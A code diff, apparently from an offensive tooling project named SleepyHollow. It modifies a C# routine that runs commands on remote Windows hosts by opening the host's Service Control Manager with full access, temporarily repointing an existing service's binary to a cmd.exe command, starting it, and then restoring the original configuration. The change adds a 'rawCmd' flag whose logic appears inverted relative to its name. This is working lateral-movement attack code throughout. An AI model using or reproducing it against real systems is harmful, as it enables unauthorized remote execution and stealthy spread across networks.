@@ -10,9 +10,9 @@ namespace SleepyHollow;
 /// </summary>
 internal static class RemoteExecution
 {
-    public static async Task Run(string hostname, string cmd, string serviceName = "SensorService", bool debug = false)
+    public static async Task Run(string hostname, string cmd, string serviceName = "SensorService", bool rawCmd = false, bool debug = false)
     {
-        cmd = $"c:\\windows\\system32\\cmd.exe /c {cmd}";
+        if (rawCmd) cmd = $"c:\\windows\\system32\\cmd.exe /c {cmd}";
         IntPtr SCMHandle = Lib.OpenSCManager(hostname, null, (uint)SCM_ACCESS.SC_MANAGER_ALL_ACCESS);
         if (SCMHandle == IntPtr.Zero)
         {
@@ -36,7 +36,7 @@ internal static class RemoteExecution
         }
         _ = Lib.StartService(serviceHandle, 0, null);
         await Task.Delay(5000);
-        result = Lib.ChangeServiceConfigA(serviceHandle, 0xffffffff, 3, 0, oldBinary, null, null, null, null, null, null);
+        result = Lib.ChangeServiceConfigA(serviceHandle, 0xffffffff, 0x3, 0, oldBinary, null, null, null, null, null, null);
         if (result == false)
         {
             Console.WriteLine("Failed to restore old service config. Error: {0}", Lib.GetLastWin32Error());
